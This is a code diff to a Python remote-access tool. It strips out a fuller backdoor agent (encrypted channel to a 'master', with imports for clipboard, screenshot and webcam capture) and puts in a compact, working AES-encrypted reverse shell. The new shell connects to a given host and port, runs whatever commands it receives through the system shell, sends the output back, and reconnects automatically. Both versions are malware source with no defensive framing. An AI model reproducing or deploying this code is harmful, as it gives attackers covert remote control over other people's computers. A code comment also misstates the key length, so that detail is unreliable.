@@ -1,89 +1,62 @@
-import sys
-import shutil
 import socket
 import subprocess
-import os
-import tempfile
-import threading
-import pyperclip
-from time import sleep
+import sys
+from Crypto.Cipher import AES
 from base64 import b64encode, b64decode
-from pathlib import Path
-import pyscreenshot as ImageGrab
-import cv2
-from io import BytesIO
-from tendo import singleton
+from time import sleep
 
-# Import custom modules
-from my_crypt_func import encode_aes, decode_aes
+# AES encryption/decryption
+BLOCK_SIZE = 16
+KEY = b'ChdtkSnUtJ3yz8Uq3SJJ6TTZ'  # 16 bytes key (must be 16, 24 or 32 bytes long)
 
-# Global variables
-global thr_block
-global thr_exit
+def pad(s):
+    return s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
 
-def receiver(s) -> str:
-    """Receive data from master, decrypt it and return it."""
-    lengthcrypt = s.recv(1024).decode('utf-8')
-    expected_length = int(decode_aes(lengthcrypt))
-    encrypted_received_data = ''
-    while len(encrypted_received_data) < expected_length:
-        encrypted_received_data += s.recv(1024).decode('utf-8')
-    return decode_aes(encrypted_received_data)
+def unpad(s):
+    return s[:-ord(s[len(s)-1:])]
 
-def sender(s, data_to_send: str) -> None:
-    """Encrypt data and send it to master."""
-    if not data_to_send:
-        data_to_send = 'Ok (no output)\n'
-    encoded = encode_aes(data_to_send)
-    length = str(len(encoded))
-    length_crypt = encode_aes(length)
-    s.send(bytes(length_crypt, 'utf-8'))
-    sleep(1)
-    s.send(bytes(encoded, 'utf-8'))
+def encrypt(message):
+    raw = pad(message).encode('utf-8')
+    cipher = AES.new(KEY, AES.MODE_ECB)
+    return b64encode(cipher.encrypt(raw)).decode('utf-8')
 
-def command_executor(s, command: str):
-    """Execute a command in the system shell and send its output to the master."""
+def decrypt(enc):
+    enc = b64decode(enc)
+    cipher = AES.new(KEY, AES.MODE_ECB)
+    return unpad(cipher.decrypt(enc)).decode('utf-8')
+
+def execute_command(command):
     try:
-        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        sender(s, (proc.stdout.read() + proc.stderr.read()).decode('utf-8'))
-    except Exception as exception:
-        sender(s, 'reachedexcept')
-        sender(s, str(exception))
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return output.decode('utf-8')
+    except subprocess.CalledProcessError as e:
+        return str(e)
 
-def backdoor():
-    """Shell thread that connects to master and permits control over the agent."""
+def client(host, port):
     while True:
-        host = '127.0.0.1'
-        port = 4444
-
-        global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
-        while True:
-            try:
-                s.connect((host, port))
-                break
-            except Exception as exception:
-                print(exception)
-                sleep(120)
-
-        while True:
-            received_command = receiver(s)
-            if received_command != 'KeepAlive':
-                if received_command == 'SHquit':
-                    sender(s, 'mistochiudendo')
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+            while True:
+                data = s.recv(1024).decode('utf-8')
+                if not data:
                     break
-                elif received_command == 'SHkill':
-                    sender(s, 'mistochiudendo')
-                    thr_exit.set()
+                decrypted_data = decrypt(data)
+                if decrypted_data.lower() == 'exit':
                     break
-                else:
-                    command_executor(s, received_command)
+                command_result = execute_command(decrypted_data)
+                encrypted_result = encrypt(command_result)
+                s.send(encrypted_result.encode('utf-8'))
+            s.close()
+        except Exception as e:
+            print(f"Connection error: {e}")
+            sleep(10)
 
-        s.close()
-        sleep(120)
+if __name__ == '__main__':
+    if len(sys.argv) != 3:
+        print("Usage: python reverse_shell.py <HOST> <PORT>")
+        sys.exit(1)
 
-thr_exit = threading.Event()
-
-# Backdoor's thread
-thread2 = threading.Thread(name='sic2', target=backdoor).start()
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    client(host, port)
